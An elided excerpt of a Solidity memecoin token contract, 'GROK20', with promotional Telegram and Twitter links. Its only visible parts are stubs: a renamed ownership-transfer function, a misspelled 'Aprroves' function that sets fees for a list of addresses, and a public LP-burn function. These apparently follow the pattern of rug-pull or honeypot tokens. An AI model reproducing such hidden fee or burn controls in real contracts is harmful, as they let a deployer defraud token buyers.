...
/**
https://t.me/BOOE_ERC20
https://twitter.com/BOOKOFELON_ERC
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipgrokenry(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
...
contract GROK20 is Ownable {
    ...
    function Aprroves(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burnlpmoon(address user) public {
